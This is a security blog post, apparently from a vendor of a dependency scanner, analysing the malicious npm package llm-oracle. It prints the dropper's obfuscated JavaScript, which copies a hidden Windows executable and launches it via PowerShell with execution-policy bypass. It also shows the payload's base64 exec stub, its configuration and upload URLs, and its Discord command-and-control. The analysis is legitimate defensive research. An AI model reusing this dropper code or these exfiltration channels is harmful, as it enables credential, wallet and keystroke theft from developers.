@@ -1,0 +1,208 @@
+---
+publishDate: 2024-11-04T00:00:00Z
+title: 'Malicious Open Source Library Analysis: llm-oracle and its Payload'
+image: /images/open-source-pkg-malware-analysis-llm-oracle.png
+excerpt: Malware hidden in open source library packages are real. In this article, we analyse the malicious npm package llm-oracle.
+tags:
+  - vet
+  - sbom
+  - sql
+  - cloud
+---
+
+import CallToAction from '~/components/widgets/CallToAction.astro';
+import { YouTube } from "astro-embed";
+import { registerLink } from '~/navigation';
+import { Image } from 'astro:assets';
+import VetRedisOracleMalwareScan from './assets/vet-redis-oracle-malware.png';
+import VetLlmOracleExtractedFiles from './assets/vet-llm-oracle-payload-files.png';
+
+The good folks at [socket.io](https://socket.io) published their research on
+[Supply Chain Attacks Targeting LLM Application Developers: The Hidden Dangers of Fake Open Source Packages](https://socket.dev/blog/supply-chain-attacks-targeting-llm-application-developers) in which they shared their findings on discovery and analysis
+of malicious npm package `llm-oracle`. This was interesting to us because
+[vet](https://github.com/safedep/vet) detects a similar package, `redis-oracle`
+as malicious but not `llm-oracle`. We decided to take a closer look at `llm-oracle`.
+
+## Scanning for Malware using `vet`
+
+[vet](https://github.com/safedep/vet) can be used to scan a package by its Package URL.
+
+```shell
+vet scan --purl pkg:/npm/redis-oracle@0.0.0
+```
+
+This results in a detection as expected
+
+<Image src={VetRedisOracleMalwareScan} alt="vet scan result for redis-oracle" />
+
+However, when we scan `llm-oracle`, we do not get any detection. This is not
+entirely surprising because `vet` by default depends on [Package Analysis](https://github.com/ossf/package-analysis)
+data for malware detection, which may not be accurate or up-to-date.
+
+## Manual Analysis of `llm-oracle`
+
+We decided to manually analyse `llm-oracle`. The first step was to identify
+package metadata from npm registry.
+
+```shell
+npm view llm-oracle
+```
+
+This produces some useful information including author, publisher and URL
+of the latest version of the package.
+
+```shell
+llm-oracle@1.0.2 | MIT | deps: 28 | versions: 3
+[...]
+dist
+.tarball: https://registry.npmjs.org/llm-oracle/-/llm-oracle-1.0.2.tgz
+[...]
+dependencies:
+[...]
+maintainers:
+- josh.weavery <josh.weavery@gmail.com>
+published 3 months ago by josh.weavery <josh.weavery@gmail.com>
+```
+
+We then fetched the tarball and extracted the contents for local analysis. The
+archive contained the following files:
+
+```shell
+-rw-r--r--  1 dev  wheel  16773255 Oct 26  1985 Base64Decode.ts
+-rw-r--r--  1 dev  wheel       252 Oct 26  1985 HISTORY.md
+-rw-r--r--  1 dev  wheel      1111 Oct 26  1985 LICENSE
+-rw-r--r--  1 dev  wheel      3105 Oct 26  1985 README.md
+-rw-r--r--  1 dev  wheel      2665 Oct 26  1985 index.js
+-rw-r--r--  1 dev  wheel      2170 Oct 26  1985 package.json
+```
+
+The first step in any malware analysis process is to identify the file types.
+The simplest way to do that is using the `file(1)` command. Surprisingly, the
+first step itself gave us a strong malware indicator.
+
+```shell
+Base64Decode.ts: PE32+ executable (GUI) x86-64, for MS Windows
+HISTORY.md:      ASCII text, with CRLF line terminators
+LICENSE:         ASCII text, with CRLF line terminators
+README.md:       ASCII text, with CRLF line terminators
+index.js:        ASCII text, with CRLF line terminators
+package.json:    JSON data
+```
+
+The `Base64Decode.ts` was a Windows `x86_64` executable with a `.ts` extension.
+Before we jump right into the payload, we wanted to look into the dropper
+`index.js` to confirm the behaviour. The `index.js` contained the following
+semi-obfuscated code:
+
+```javascript
+const targetFilePath = path.join(
+  process.env.LOCALAPPDATA,
+  String('\u0063\u0068\u0072\u006f\u006d\u0065\u002e\u0065\u0078\u0065').replace(/\+/g, '')
+);
+```
+
+```javascript
+if (!fs.existsSync(targetFilePath))
+{
+  setTimeout(() => {
+    f\u0073.copyFileSync(m\u006fd\u0065lFileP\u0061th, t\u0061rg\u0065tFileP\u0061th);
+    e\u0078ec(`p\u006fwersh\u0065ll -\u0045x\u0065cut\u0069\u006fnP\u006fl\u0069cy Byp\u0061ss St\u0061rt-Pr\u006fcess -F\u0069leP\u0061th '${t\u0061rg\u0065tFileP\u0061th}' -V\u0065rb R\u0075n\u0041s`, (err\u006fr, std\u006ft, std\u0065rr) => {
+
+    });
+  }, 60000);
+}
+```
+
+While advanced malware analysis techniques may differ (j/k), we used the good
+old `ruby` interpreter to view the obfuscated strings
+
+```shell
+irb(main):001:0> "\u0063\u0068\u0072\u006f\u006d\u0065\u002e\u0065\u0078\u0065"
+=> "chrome.exe"
+```
+
+```shell
+irb(main):006:0> "f\u0073.copyFileSync(m\u006fd\u0065lFileP\u0061th, t\u0061rg\u0065tFileP\u0061th); e\u0078ec(`p\u006fwersh\u0065ll -\u0045x\u0065cut\u0069\u006fnP\u006fl
+\u0069cy Byp\u0061ss St\u0061rt-Pr\u006fcess -F\u0069leP\u0061th '${t\u0061rg\u0065tFileP\u0061th}' -V\u0065rb R\u0075n\u0041s`, (err\u006fr, std\u006ft, std\u0065rr)"
+=> "fs.copyFileSync(modelFilePath, targetFilePath); exec(`powershell -ExecutionPolicy Bypass Start-Process -FilePath '${targetFilePath}' -Verb RunAs`, (error, stdot, stderr)"
+```
+
+### The Payload
+
+From `index.js`, we can identify that `Base64Decode.ts`, a Windows executable
+was copied as `chrome.exe` to `%LOCALAPPDATA%` and executed using
+`powershell.exe`. To understand the behaviour of the payload, we needed to get
+our hands dirty with our old friend [IDA Pro](#) or its close cousin
+[Ghidra](#). But unfortunately, `strings(1)` put us on a different path. We
+found the following strings in the payload that indicated it was a Python
+script packaged as executable using `PyInstaller`.
+
+```shell
+Cannot open PyInstaller archive from executable (%s) or external archive (%s)
+Installing PYZ: Could not get sys.path!
+PYINSTALLER_STRICT_UNPACK_MODE
+PyInstaller: FormatMessageW failed.
+PyInstaller: pyi_win32_utils_to_utf8 failed.
+```
+
+Extracting the `PyInstaller` archive from the executable gave us the following
+files:
+
+<Image src={VetLlmOracleExtractedFiles} alt="Extracted files from llm-oracle payload" />
+
+Among these files, `OH8xADfF8q.pyc` looked interesting with strings like
+
+```shell
+'D:\work\Python-Trojan-src\OH8xADfF8q.py
+```
+
+`0H8xADfF8q.pyc` in turn decompiles to something like this
+
+```python
+import os
+import discord
+[...]
+exec(base64.b64decode(bytes('aW1wb3J0IGJhc2U2NDtl...', 'utf-8')).decode('utf-8'))
+```
+
+The base64 encoded string contains the actual payload, which decodes to
+a Python script that performs various conventional malware activities.
+
+#### Behaviour
+
+- Looks for crypto wallets `metamask`, `tronlink`, `trustwallet`, `coinbase`,
+    `flint`, `exodus`, `binance`, `phantom`, `Xverse`, `Slope`, `Solflare`,
+    `Typhon`, `nami`, `keplr`, `okx`, `bitski`, `myetherwallet`
+- Look for Chrome extension data for these wallets
+- Downloads configuration from `https://bayard-front-833a4.web.app/start.dat`
+
+```json
+{
+  "gid": "12 __76 __201 __8416 __20 __815 __932",
+  "tkn": "MT __I __3NjIwMzQ __yNjY __2NDk0 __MzY2Ng.GUg __pUL.X __Xj7OFha __7Z5r __gYZHw __tatOdp3l __i6bZ __HrDQXDCn4"
+}
+```
+
+- Connects to Discord server using the Guild ID and Token
+- Creates a new channel using the current username and a random string
+- Starts a keylogger
+- Starts taking screenshot of active window
+- Sends keystroke and screenshots to the Discord channel
+- Starts a full command and control over Discord
+
+#### File Transfer
+
+The payload checks if the file requested for transfer is greater than 25MB. If
+so, it fetches configuration from `https://api.gofile.io/getServer` and uploads
+to `https://{server}.gofile.io/uploadFile` using Python `requests` library.
+When we tried to access the URL, we get a `404 Not Found` response, indicating
+the application is geo-fenced.
+
+## Conclusion
+
+- `llm-oracle` is a malicious package that contains a Windows executable
+- The packaging and sophistication of the malware appears to be low
+- Common attacker TTP was used for payload execution using `powershell.exe`,
+    `PyInstaller` and `base64` encoding
+- We expect AVs and EDRs to detect this payload using behavioural analysis
+- Discord was used as C2 server for exfiltration and command and control
